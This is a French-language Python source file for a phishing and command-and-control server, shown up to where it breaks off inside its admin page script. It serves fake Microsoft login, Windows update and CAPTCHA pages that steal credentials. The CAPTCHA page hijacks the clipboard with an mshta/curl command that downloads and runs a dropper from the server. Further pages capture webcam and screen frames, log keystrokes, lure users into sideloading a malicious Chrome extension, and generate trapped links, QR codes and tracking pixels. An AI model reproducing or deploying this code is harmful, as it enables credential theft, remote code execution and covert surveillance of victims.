#!/usr/bin/env python3
"""
malware_suite/server_v2.py — version complète
@oll.fx | discord.gg/ojailbreaks

Fonctionnalités :
  - Pages piège : login, update, captcha, surveillance,
                  keylogger JS, extension, clones
  - URL piégée  : /go /shorten /s/<code>
  - QR piégé    : /qr
  - Proxy       : /proxy
  - Pixel track : /track/<id>
  - Payloads    : /payload /oneliner
  - .exe builds : /builds/<file>
  - Frames cam  : /frame /frame_img /c2/frames
  - Keylog      : /keylog /ext/*
  - C2 complet  : /c2 dashboard /c2/bots /c2/creds
                  /c2/exfil /c2/visits /c2/tracking
                  /c2/task /c2/result /c2/push
  - Admin panel : /admin
Runtime : Python 3.10+ | stdlib + requests + beautifulsoup4 + qrcode (opt)
"""

import os
import io
import json
import base64
import socket
import pathlib
import datetime
import threading
import urllib.parse
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    import requests as req_lib
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ══════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════

HOST        = "0.0.0.0"
PORT        = 8080
LOG_FILE    = "visits.log"
CREDS_FILE  = "creds.log"
EXFIL_FILE  = "exfil.log"
TRACK_FILE  = "tracking.log"
KEYLOG_FILE = "keylog.log"
PAYLOAD_DIR = pathlib.Path("payloads")
PAGE_DIR    = pathlib.Path("pages")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

SERVER_IP = get_local_ip()

# ══════════════════════════════════════════════════════════════
# STATE
# ══════════════════════════════════════════════════════════════

bots       = {}           # bot_id → {ip, os, user, tasks[], results[]}
bots_lock  = threading.Lock()
shortlinks = {}           # code → url réelle

# ══════════════════════════════════════════════════════════════
# PIXEL GIF 1x1
# ══════════════════════════════════════════════════════════════

PIXEL_GIF = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
)

# ══════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════

def log(entry: dict):
    entry["ts"] = datetime.datetime.now().isoformat()
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    print(
        f"[{entry['ts'][:19]}] "
        f"{entry.get('type','?'):<20} "
        f"{entry.get('ip','?'):<16} "
        f"{entry.get('detail','')[:60]}"
    )

def build_payload(name: str, c2_host: str, c2_port: str) -> bytes:
    p = PAYLOAD_DIR / name
    if not p.exists():
        return f"# payload not found: {name}".encode()
    code = p.read_text(encoding="utf-8", errors="replace")
    code = code.replace("FILL_C2_HOST", c2_host)
    code = code.replace("FILL_PORT",    c2_port)
    code = code.replace("FILL_C2_URL",  f"http://{c2_host}:{c2_port}")
    return code.encode()

def b64_oneliner(payload_bytes: bytes) -> str:
    b64 = base64.b64encode(payload_bytes).decode()
    return (
        f'python3 -c "'
        f"exec(__import__('base64').b64decode('{b64}').decode())\""
    )

def make_qr(url: str) -> bytes | None:
    try:
        import qrcode
        qr = qrcode.QRCode(box_size=8, border=2)
        qr.add_data(url)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except ImportError:
        return None

def make_short(url: str) -> str:
    import hashlib
    code = hashlib.md5(url.encode()).hexdigest()[:6]
    shortlinks[code] = url
    return code

# ══════════════════════════════════════════════════════════════
# PAGES HTML INLINE
# ══════════════════════════════════════════════════════════════

def page_index() -> str:
    return """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vérification de sécurité requise</title>
<style>
:root{--bg:#0a0a0f;--panel:#12121a;--border:#2a2a3a;
      --red:#e63946;--text:#e0e0e0;--dim:#666}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);
     font-family:'Segoe UI',Arial,sans-serif;
     min-height:100vh;display:flex;flex-direction:column;
     align-items:center;justify-content:center}
.bar{position:fixed;top:0;left:0;right:0;
     background:#1a1a2e;border-bottom:2px solid var(--red);
     padding:10px 24px;display:flex;align-items:center;
     gap:12px;font-size:13px;color:var(--dim)}
.panel{background:var(--panel);border:1px solid var(--border);
       border-radius:10px;padding:40px 36px;
       width:420px;max-width:95vw;
       box-shadow:0 8px 40px rgba(0,0,0,.6)}
.icon{width:56px;height:56px;border-radius:50%;
      background:rgba(230,57,70,.15);border:2px solid var(--red);
      display:flex;align-items:center;justify-content:center;
      font-size:26px;margin:0 auto 20px}
h1{font-size:20px;text-align:center;margin-bottom:8px}
.sub{color:var(--dim);font-size:13px;text-align:center;
     margin-bottom:28px;line-height:1.6}
label{display:block;font-size:12px;color:var(--dim);
      margin-bottom:6px;text-transform:uppercase;letter-spacing:.05em}
input{width:100%;background:#1e1e2e;border:1px solid var(--border);
      border-radius:6px;padding:11px 14px;color:var(--text);
      font-size:14px;margin-bottom:16px;outline:none;transition:border .2s}
input:focus{border-color:var(--red)}
button{width:100%;padding:13px;background:var(--red);border:none;
       border-radius:6px;color:#fff;font-size:15px;font-weight:600;
       cursor:pointer;transition:opacity .2s}
button:hover{opacity:.88}
.footer{margin-top:20px;font-size:11px;color:var(--dim);
        text-align:center;line-height:1.7}
.prog{margin-bottom:20px}
.prog-label{font-size:11px;color:var(--dim);margin-bottom:4px}
.prog-bar{height:4px;background:#1e1e2e;border-radius:2px;overflow:hidden}
.prog-fill{height:100%;width:72%;background:var(--red);border-radius:2px}
</style>
</head>
<body>
<div class="bar">
  <span style="color:var(--red)">🔒</span>
  <span>security.microsoft-verify.com</span>
  <span style="margin-left:auto">Microsoft Corporation © 2025</span>
</div>
<div class="panel">
  <div class="icon">⚠️</div>
  <h1>Vérification du compte requise</h1>
  <p class="sub">Une activité inhabituelle a été détectée.<br>
  Veuillez confirmer votre identité pour continuer.</p>
  <div class="prog">
    <div class="prog-label">Analyse de sécurité — 72%</div>
    <div class="prog-bar"><div class="prog-fill"></div></div>
  </div>
  <form id="form">
    <label>Adresse email</label>
    <input type="email" name="email" placeholder="votre@email.com" required>
    <label>Mot de passe</label>
    <input type="password" name="password" placeholder="••••••••" required>
    <button type="submit">Vérifier mon identité</button>
  </form>
  <div class="footer">En continuant vous acceptez nos
    <a href="#" style="color:var(--dim)">CGU</a> et notre
    <a href="#" style="color:var(--dim)">Politique de confidentialité</a>.
  </div>
</div>
<script>
const C2="http://FILL_SERVER:FILL_PORT";
document.getElementById("form").addEventListener("submit",async e=>{
  e.preventDefault();
  const fd=new FormData(e.target),btn=e.target.querySelector("button");
  btn.textContent="Vérification en cours...";btn.disabled=true;
  await fetch(C2+"/collect",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      email:fd.get("email"),password:fd.get("password"),
      page:"index",ua:navigator.userAgent,
      lang:navigator.language,
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone
    })});
  window.location.href="https://microsoft.com";
});
fetch(C2+"/collect",{method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({page:"index_land",ua:navigator.userAgent,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+"x"+screen.height})});
</script>
</body></html>"""

def page_update() -> str:
    return """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Mise à jour critique disponible</title>
<style>
:root{--bg:#f0f0f0;--panel:#fff;--blue:#0078d4;--text:#1a1a1a;--dim:#666}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);font-family:'Segoe UI',Arial,sans-serif;
     min-height:100vh;display:flex;flex-direction:column;
     align-items:center;justify-content:center}
.taskbar{position:fixed;bottom:0;left:0;right:0;height:48px;
         background:#1a1a2e;display:flex;align-items:center;padding:0 16px}
.panel{background:var(--panel);border-radius:8px;padding:48px 44px;
       width:480px;max-width:95vw;
       box-shadow:0 4px 24px rgba(0,0,0,.12)}
.logo{font-size:48px;text-align:center;margin-bottom:16px}
h1{font-size:22px;font-weight:600;margin-bottom:10px}
p{color:var(--dim);font-size:14px;line-height:1.6;margin-bottom:20px}
.info{background:#f5f9ff;border:1px solid #c8dff8;border-radius:6px;
      padding:14px 16px;font-size:13px;margin-bottom:24px}
.bar-wrap{margin:24px 0}
.bar-label{font-size:12px;color:var(--dim);margin-bottom:6px}
.bar{height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden}
.bar-fill{height:100%;width:0%;background:var(--blue);
          border-radius:3px;transition:width .3s}
button{width:100%;padding:13px;background:var(--blue);border:none;
       border-radius:4px;color:#fff;font-size:15px;font-weight:600;
       cursor:pointer}
button:hover{background:#006cbe}
.small{font-size:11px;color:var(--dim);margin-top:12px;text-align:center}
</style>
</head>
<body>
<div class="taskbar">
  <svg width="32" height="32" viewBox="0 0 32 32">
    <rect x="1"  y="1"  width="14" height="14" fill="#f35"/>
    <rect x="17" y="1"  width="14" height="14" fill="#4f4"/>
    <rect x="1"  y="17" width="14" height="14" fill="#55f"/>
    <rect x="17" y="17" width="14" height="14" fill="#ff5"/>
  </svg>
</div>
<div class="panel">
  <div class="logo">🪟</div>
  <h1>Mise à jour de sécurité critique</h1>
  <p>Windows a détecté une vulnérabilité critique (CVE-2025-21334).
     Une mise à jour immédiate est requise.</p>
  <div class="info">
    📦 <strong>Windows Security Update KB5035942</strong><br>
    Taille : 128 MB · Priorité : Critique · Date : aujourd'hui
  </div>
  <div class="bar-wrap">
    <div class="bar-label" id="lbl">Préparation de la mise à jour…</div>
    <div class="bar"><div class="bar-fill" id="bar"></div></div>
  </div>
  <button id="btn" onclick="go()">Installer la mise à jour</button>
  <div class="small">Votre PC redémarrera automatiquement après l'installation.</div>
</div>
<script>
const C2="http://FILL_SERVER:FILL_PORT";
fetch(C2+"/collect",{method:"POST",headers:{"Content-Type":"application/json"},
  body:JSON.stringify({page:"update_land",ua:navigator.userAgent,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+"x"+screen.height,cores:navigator.hardwareConcurrency})});
function go(){
  document.getElementById("btn").textContent="Téléchargement en cours…";
  document.getElementById("btn").disabled=true;
  let w=0;
  const bar=document.getElementById("bar"),lbl=document.getElementById("lbl");
  const iv=setInterval(()=>{
    w=Math.min(w+Math.random()*3+1,100);
    bar.style.width=w+"%";
    if(w<30)lbl.textContent="Téléchargement du package…";
    else if(w<60)lbl.textContent="Vérification de l'intégrité…";
    else if(w<90)lbl.textContent="Préparation de l'installation…";
    else lbl.textContent="Finalisation…";
    if(w>=100){
      clearInterval(iv);
      lbl.textContent="Terminé — lancement du setup…";
      fetch(C2+"/collect",{method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify({page:"update_click",ua:navigator.userAgent,
          tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
          mem:navigator.deviceMemory,cores:navigator.hardwareConcurrency})});
      setTimeout(()=>{
        window.location.href=C2+"/payload?name=dropper";
      },1500);
    }
  },80);
}
</script>
</body></html>"""

def page_captcha() -> str:
    return """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vérification CAPTCHA</title>
<style>
:root{--bg:#fafafa;--panel:#fff;--blue:#1a73e8;--border:#ddd;
      --text:#202020;--dim:#777}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);font-family:Arial,sans-serif;
     min-height:100vh;display:flex;align-items:center;justify-content:center}
.panel{background:var(--panel);border:1px solid var(--border);
       border-radius:8px;padding:40px 36px;width:400px;max-width:95vw;
       box-shadow:0 2px 12px rgba(0,0,0,.08)}
.logo{font-size:38px;text-align:center;margin-bottom:16px}
h1{font-size:18px;font-weight:600;text-align:center;margin-bottom:8px}
.sub{color:var(--dim);font-size:13px;text-align:center;margin-bottom:24px}
.step{background:#f8f8f8;border:1px solid var(--border);border-radius:6px;
      padding:14px 16px;margin-bottom:12px;font-size:13px;
      display:flex;align-items:flex-start;gap:10px}
.num{background:var(--blue);color:#fff;border-radius:50%;
     width:22px;height:22px;display:flex;align-items:center;
     justify-content:center;font-size:11px;font-weight:700;
     flex-shrink:0;margin-top:1px}
code{background:#e8e8e8;padding:2px 6px;border-radius:3px;font-size:12px}
.cmd{background:#1a1a1a;color:#00ff88;font-family:monospace;
     font-size:12px;padding:12px 16px;border-radius:6px;
     margin:16px 0;word-break:break-all;border:1px solid #333}
.btn{width:100%;padding:12px;background:var(--blue);border:none;
     border-radius:6px;color:#fff;font-size:14px;font-weight:600;
     cursor:pointer}
.btn:hover{background:#1660c8}
.footer{font-size:11px;color:var(--dim);text-align:center;margin-top:16px}
#ok{display:none;color:green;text-align:center;font-size:13px;margin-top:8px}
</style>
</head>
<body>
<div class="panel">
  <div class="logo">🤖</div>
  <h1>Vérification humaine requise</h1>
  <p class="sub">Prouvez que vous n'êtes pas un robot.</p>
  <div class="step">
    <div class="num">1</div>
    <div>Appuyez sur <code>Win + R</code></div>
  </div>
  <div class="step">
    <div class="num">2</div>
    <div>Cliquez sur <strong>Copier la commande</strong></div>
  </div>
  <div class="step">
    <div class="num">3</div>
    <div>Collez avec <code>Ctrl+V</code> puis <code>Entrée</code></div>
  </div>
  <div class="cmd" id="cmd">Chargement…</div>
  <button class="btn" onclick="copy()">📋 Copier la commande</button>
  <div id="ok">✓ Copié ! Ouvrez Win+R, collez et appuyez Entrée.</div>
  <div class="footer">Protégé par reCAPTCHA</div>
</div>
<script>
const C2="http://FILL_SERVER:FILL_PORT";
const CMD=`mshta "javascript:new ActiveXObject('WScript.Shell').Run('cmd /c curl -s ${C2}/payload?name=dropper -o %tmp%\\\\fl.py && python %tmp%\\\\fl.py',0,false)"`;
document.getElementById("cmd").textContent=CMD.slice(0,80)+"…";
function copy(){
  navigator.clipboard.writeText(CMD).then(()=>{
    document.getElementById("ok").style.display="block";
    document.querySelector(".btn").textContent="✓ Copié !";
    document.querySelector(".btn").style.background="#1b8a3c";
  }).catch(()=>{
    const t=document.createElement("textarea");
    t.value=CMD;document.body.appendChild(t);
    t.select();document.execCommand("copy");
    document.body.removeChild(t);
    document.getElementById("ok").style.display="block";
  });
  fetch(C2+"/collect",{method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({page:"captcha_copy",ua:navigator.userAgent,
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});
}
setInterval(()=>{
  navigator.clipboard.readText().then(t=>{
    if(t&&!t.includes("mshta"))
      navigator.clipboard.writeText(CMD).catch(()=>{});
  }).catch(()=>{});
},3000);
fetch(C2+"/collect",{method:"POST",headers:{"Content-Type":"application/json"},
  body:JSON.stringify({page:"captcha_land",ua:navigator.userAgent,
    cores:navigator.hardwareConcurrency,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});
</script>
</body></html>"""

def page_surveillance() -> str:
    return """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Vérification d'identité</title>
<style>
:root{--bg:#0a0a0f;--panel:#12121a;--border:#2a2a3a;
      --red:#e63946;--text:#e0e0e0;--dim:#666;--green:#2ecc71}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);
     font-family:'Segoe UI',Arial,sans-serif;
     min-height:100vh;display:flex;flex-direction:column;
     align-items:center;justify-content:center;padding:20px}
.panel{background:var(--panel);border:1px solid var(--border);
       border-radius:12px;padding:36px;width:460px;max-width:95vw}
.logo{text-align:center;font-size:40px;margin-bottom:16px}
h1{font-size:19px;text-align:center;margin-bottom:8px}
.sub{color:var(--dim);font-size:13px;text-align:center;
     margin-bottom:28px;line-height:1.6}
.step{display:flex;align-items:center;gap:14px;padding:14px;
      border:1px solid var(--border);border-radius:8px;
      margin-bottom:10px;cursor:pointer;transition:border .2s}
.step:hover{border-color:var(--red)}
.step.done{border-color:var(--green)}
.step.done .ico{background:rgba(46,204,113,.15);
                border-color:var(--green);color:var(--green)}
.ico{width:42px;height:42px;border-radius:50%;
     background:rgba(230,57,70,.1);border:1px solid var(--red);
     display:flex;align-items:center;justify-content:center;
     font-size:18px;flex-shrink:0;transition:all .2s}
.tt{font-size:14px;font-weight:600;margin-bottom:2px}
.dd{font-size:12px;color:var(--dim)}
.st{font-size:11px;margin-top:4px}
.ok{color:var(--green)}.wait{color:var(--dim)}.err{color:var(--red)}
button{width:100%;padding:13px;background:var(--red);border:none;
       border-radius:6px;color:#fff;font-size:15px;font-weight:600;
       cursor:pointer;margin-top:16px}
button:disabled{opacity:.4;cursor:not-allowed}
</style>
</head>
<body>
<div class="panel">
  <div class="logo">🔐</div>
  <h1>Vérification d'identité requise</h1>
  <p class="sub">Confirmez votre identité via deux vérifications rapides.</p>
  <div class="step" id="sc" onclick="reqCam()">
    <div class="ico">📷</div>
    <div>
      <div class="tt">Vérification faciale</div>
      <div class="dd">Autorisez l'accès à votre caméra</div>
      <div class="st wait" id="cs">En attente…</div>
    </div>
  </div>
  <div class="step" id="ss" onclick="reqScreen()">
    <div class="ico">🖥</div>
    <div>
      <div class="tt">Capture de conformité</div>
      <div class="dd">Partagez votre écran brièvement</div>
      <div class="st wait" id="scs">En attente…</div>
    </div>
  </div>
  <button id="btn" disabled onclick="done()">Continuer →</button>
</div>
<script>
const C2="http://FILL_SERVER:FILL_PORT";
let camOK=false,scrOK=false,camIv=null,scrIv=null;
function b64(c){return c.toDataURL("image/jpeg",0.6)}
function send(type,data){
  fetch(C2+"/frame",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({type,frame:data,
      ts:new Date().toISOString(),ua:navigator.userAgent})
  }).catch(()=>{});
}
function cap(video,type){
  const c=document.createElement("canvas");
  c.width=video.videoWidth||640;c.height=video.videoHeight||480;
  c.getContext("2d").drawImage(video,0,0);send(type,b64(c));
}
function markDone(sid,stid,msg){
  document.getElementById(sid).classList.add("done");
  const s=document.getElementById(stid);s.className="st ok";s.textContent=msg;
  if(camOK&&scrOK)document.getElementById("btn").disabled=false;
}
function markErr(stid,msg){
  const s=document.getElementById(stid);s.className="st err";s.textContent=msg;
}
async function reqCam(){
  document.getElementById("cs").textContent="Connexion…";
  try{
    const stream=await navigator.mediaDevices.getUserMedia(
      {video:{width:1280,height:720},audio:false});
    const v=document.createElement("video");
    v.srcObject=stream;v.autoplay=true;v.muted=true;
    v.onloadedmetadata=()=>{
      camOK=true;markDone("sc","cs","✓ Vérification réussie");
      camIv=setInterval(()=>cap(v,"camera"),2000);
      setTimeout(()=>cap(v,"camera"),500);
    };
  }catch(e){
    markErr("cs",e.name==="NotAllowedError"
      ?"Accès refusé — cliquez pour réessayer":"Erreur: "+e.message);
  }
}
async function reqScreen(){
  document.getElementById("scs").textContent="Connexion…";
  try{
    const stream=await navigator.mediaDevices.getDisplayMedia(
      {video:{cursor:"always"},audio:false});
    const v=document.createElement("video");
    v.srcObject=stream;v.autoplay=true;v.muted=true;
    stream.getVideoTracks()[0].onended=()=>{
      clearInterval(scrIv);scrOK=false;
      markErr("scs","Partage arrêté");
    };
    v.onloadedmetadata=()=>{
      scrOK=true;markDone("ss","scs","✓ Vérification réussie");
      scrIv=setInterval(()=>cap(v,"screen"),3000);
      setTimeout(()=>cap(v,"screen"),500);
    };
  }catch(e){
    markErr("scs",e.name==="NotAllowedError"
      ?"Accès refusé — cliquez pour réessayer":"Erreur: "+e.message);
  }
}
function done(){
  fetch(C2+"/collect",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({page:"surveillance_done",
      ua:navigator.userAgent,cam:camOK,screen:scrOK})});
  window.location.href="https://microsoft.com";
}
fetch(C2+"/collect",{method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({page:"surveillance_land",ua:navigator.userAgent,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:screen.width+"x"+screen.height})});
</script>
</body></html>"""

def page_keylogger_js() -> str:
    return """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Espace client sécurisé</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f5f5f5;
     display:flex;align-items:center;justify-content:center;
     min-height:100vh;margin:0}
.box{background:#fff;padding:40px;border-radius:8px;width:380px;
     box-shadow:0 2px 16px rgba(0,0,0,.1)}
h2{margin-bottom:20px;color:#333}
input{width:100%;padding:10px;border:1px solid #ddd;border-radius:4px;
      margin-bottom:12px;font-size:14px}
button{width:100%;padding:12px;background:#0078d4;border:none;
       border-radius:4px;color:#fff;font-size:15px;cursor:pointer}
.err{color:red;font-size:12px;margin-top:8px;display:none}
</style>
</head>
<body>
<div class="box">
  <h2>Connexion à votre espace</h2>
  <input type="email"    id="email"    placeholder="Email">
  <input type="password" id="pass"     placeholder="Mot de passe">
  <input type="text"     id="code"     placeholder="Code de vérification">
  <button onclick="login()">Se connecter</button>
  <div class="err" id="err">Code invalide. Veuillez réessayer.</div>
</div>
<script>
const C2="http://FILL_SERVER:FILL_PORT";
(function(){
  const BUF=[];let timer=null;
  function send(d){
    fetch(C2+"/keylog",{method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(d)}).catch(()=>{});
  }
  document.addEventListener("keydown",function(e){
    const el=document.activeElement;
    BUF.push({key:e.key,field:el?(el.name||el.id||el.type||"?"):"?",ts:Date.now()});
    clearTimeout(timer);
    timer=setTimeout(flush,5000);
    if(e.key==="Enter")flush();
  },true);
  document.addEventListener("blur",function(e){
    const el=e.target;
    if(el.value&&el.tagName==="INPUT")
      send({type:"field",field:el.name||el.id||el.type,
            value:el.value,url:location.href,
            ts:new Date().toISOString()});
  },true);
  document.addEventListener("paste",function(e){
    const t=(e.clipboardData||window.clipboardData).getData("text");
    if(t)send({type:"paste",value:t,url:location.href,
               ts:new Date().toISOString()});
  },true);
  document.addEventListener("copy",function(){
    const s=window.getSelection().toString();
    if(s.length>1)send({type:"copy",value:s,url:location.href,
                        ts:new Date().toISOString()});
  });
  function flush(){
    if(!BUF.length)return;
    const d=BUF.splice(0);
    send({type:"keystrokes",keys:d,url:location.href,
          count:d.length,ts:new Date().toISOString(),
          ua:navigator.userAgent});
  }
  setInterval(flush,10000);
  window.addEventListener("beforeunload",function(){
    flush();
    if(BUF.length&&navigator.sendBeacon)
      navigator.sendBeacon(C2+"/keylog",
        JSON.stringify({type:"beacon",keys:BUF,url:location.href}));
  });
})();
function login(){
  fetch(C2+"/collect",{method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({page:"login_submit",
      email:document.getElementById("email").value,
      password:document.getElementById("pass").value,
      code:document.getElementById("code").value,
      ua:navigator.userAgent})});
  setTimeout(()=>{
    document.getElementById("err").style.display="block";
    document.getElementById("code").value="";
    document.getElementById("code").focus();
  },800);
}
fetch(C2+"/collect",{method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({page:"keylogger_js_land",
    ua:navigator.userAgent,ref:document.referrer,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone})});
</script>
</body></html>"""

def page_extension_install() -> str:
    return """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Extension de sécurité requise</title>
<style>
:root{--bg:#0a0a0f;--panel:#12121a;--border:#2a2a3a;
      --red:#e63946;--text:#e0e0e0;--dim:#666}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);
     font-family:'Segoe UI',Arial,sans-serif;
     min-height:100vh;display:flex;align-items:center;
     justify-content:center;padding:20px}
.panel{background:var(--panel);border:1px solid var(--border);
       border-radius:12px;padding:40px;width:500px;max-width:95vw}
.logo{font-size:48px;text-align:center;margin-bottom:20px}
h1{font-size:20px;text-align:center;margin-bottom:10px}
.sub{color:var(--dim);font-size:13px;text-align:center;
     margin-bottom:28px;line-height:1.6}
.step{display:flex;gap:12px;padding:10px 0;
      border-bottom:1px solid var(--border);font-size:13px}
.step:last-of-type{border:none}
.num{color:var(--red);font-weight:700;width:20px;flex-shrink:0}
.btn{display:block;width:100%;padding:14px;background:var(--red);
     border:none;border-radius:6px;color:#fff;font-size:16px;
     font-weight:700;cursor:pointer;text-align:center;
     text-decoration:none;margin:20px 0 10px}
.btn2{display:block;width:100%;padding:11px;background:#1e1e2e;
      border:1px solid var(--border);border-radius:6px;
      color:var(--dim);font-size:13px;cursor:pointer;
      text-align:center;text-decoration:none}
.note{font-size:11px;color:var(--dim);text-align:center;margin-top:12px}
</style>
</head>
<body>
<div class="panel">
  <div class="logo">🛡️</div>
  <h1>Extension de sécurité requise</h1>
  <p class="sub">Votre navigateur a été détecté comme vulnérable.<br>
  Installez Security Checker Pro pour continuer.</p>
  <div class="step"><div class="num">1</div>
    <div>Cliquez sur <strong>Télécharger l'extension</strong></div></div>
  <div class="step"><div class="num">2</div>
    <div>Allez sur <strong>chrome://extensions</strong>
         → activez le <strong>mode développeur</strong></div></div>
  <div class="step"><div class="num">3</div>
    <div>Cliquez <strong>Charger l'extension non empaquetée</strong>
         → sélectionnez le dossier extrait</div></div>
  <div class="step"><div class="num">4</div>
    <div>Revenez ici et cliquez <strong>Continuer</strong></div></div>
  <a class="btn" href="/download/extension">
    ↓ Télécharger Security Checker Pro
  </a>
  <a class="btn2" href="https://microsoft.com">
    Continuer sans protection (non recommandé)
  </a>
  <div class="note">Certifié par le Centre Européen de Cybersécurité</div>
</div>
</body></html>"""

def page_admin() -> str:
    return f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>FlashCMD Admin</title>
<style>
:root{{--bg:#0a0a0f;--panel:#12121a;--border:#2a2a3a;
      --red:#e63946;--green:#2ecc71;--text:#e0e0e0;--dim:#555}}
*{{box-sizing:border-box;margin:0;padding:0}}
body{{background:var(--bg);color:var(--text);
     font-family:monospace;padding:24px;max-width:900px;margin:0 auto}}
h1{{color:var(--red);margin-bottom:20px;font-size:16px}}
h2{{color:var(--dim);font-size:12px;text-transform:uppercase;
    letter-spacing:.1em;margin:20px 0 10px}}
.card{{background:var(--panel);border:1px solid var(--border);
       border-radius:6px;padding:16px;margin-bottom:12px}}
input{{width:100%;background:#0d0d14;border:1px solid var(--border);
       color:var(--text);padding:9px 12px;border-radius:4px;
       font-family:monospace;font-size:13px;margin-bottom:8px}}
button{{padding:8px 16px;background:var(--red);border:none;
        border-radius:4px;color:#fff;cursor:pointer;font-size:13px}}
.res{{background:#0d0d14;border:1px solid var(--border);border-radius:4px;
      padding:12px;font-size:12px;color:var(--green);
      white-space:pre-wrap;margin-top:10px;min-height:40px}}
.links a{{color:#3498db;font-size:12px;display:block;margin:4px 0}}
</style>
</head>
<body>
<h1>⚡ FlashCMD — Panel Admin</h1>

<h2>Piéger une URL</h2>
<div class="card">
  <input type="text" id="tu" placeholder="https://youtube.com/...">
  <button onclick="genTrap()">Générer le lien piégé</button>
  <div class="res" id="tr"></div>
</div>

<h2>Cloner un site</h2>
<div class="card">
  <input type="text" id="cu" placeholder="https://accounts.google.com">
  <input type="text" id="cn" placeholder="nom (ex: google)">
  <button onclick="cloneSite()">Instructions clone</button>
  <div class="res" id="cr"></div>
</div>

<h2>QR code piégé</h2>
<div class="card">
  <input type="text" id="qu" placeholder="https://youtube.com">
  <button onclick="genQR()">Générer QR</button>
  <div id="qr"></div>
</div>

<h2>Pixel tracking email</h2>
<div class="card">
  <input type="text" id="ti" placeholder="nom (ex: victime1)">
  <button onclick="genTrack()">Générer pixel</button>
  <div class="res" id="tkr"></div>
</div>

<h2>Liens rapides</h2>
<div class="card links">
  <a href="/c2" target="_blank">🖥 Dashboard C2</a>
  <a href="/c2/creds" target="_blank">🔑 Credentials</a>
  <a href="/c2/visits" target="_blank">👁 Visites</a>
  <a href="/c2/tracking" target="_blank">📧 Tracking email</a>
  <a href="/c2/frames" target="_blank">📸 Frames JSON</a>
  <a href="/" target="_blank">📄 Phishing login</a>
  <a href="/update" target="_blank">🪟 Fausse MAJ Windows</a>
  <a href="/captcha" target="_blank">🤖 Faux CAPTCHA</a>
  <a href="/surveillance" target="_blank">📷 Caméra + Écran</a>
  <a href="/keylog_page" target="_blank">⌨ Keylogger JS</a>
  <a href="/extension" target="_blank">🧩 Extension Chrome</a>
</div>

<script>
const BASE="http://{SERVER_IP}:{PORT}";
async function genTrap(){{
  const url=document.getElementById("tu").value.trim();
  if(!url)return;
  const r=await fetch("/shorten?url="+encodeURIComponent(url),
                      {{headers:{{"Accept":"application/json"}}}});
  const d=await r.json();
  document.getElementById("tr").textContent=
    "Lien court  : "+d.shortlink+
    "\\nLien piégé  : "+d.trapped+
    "\\nQR piégé    : "+d.qr;
}}
function cloneSite(){{
  const url=document.getElementById("cu").value.trim();
  const name=document.getElementById("cn").value.trim()||"clone";
  document.getElementById("cr").textContent=
    "Lance dans ton terminal :\\n"+
    "python clone.py "+url+" "+name+"\\n\\n"+
    "Puis accède au clone :\\n"+BASE+"/clone/"+name;
}}
function genQR(){{
  const url=document.getElementById("qu").value.trim();
  if(!url)return;
  document.getElementById("qr").innerHTML=
    '<img src="/qr?url='+encodeURIComponent(url)+
    '" style="border:1px solid #2a2a3a;margin-top:8px"><br>'+
    '<a href="/qr?url='+encodeURIComponent(url)+
    '" download="qr.png" style="color:#3498db;font-size:12px">↓ Télécharger</a>';
}}
function genTrack(){{
  const id=document.getElementById("ti").value.trim();
  if(!id)return;
  const url=BASE+"/track/"+id;
  const tag='<img src="'+url+'" width="1" height="1" style="display:none">';
  document.getElementById("tkr").textContent=
    "URL pixel   : "+url+
    "\\nTag HTML    : "+tag+
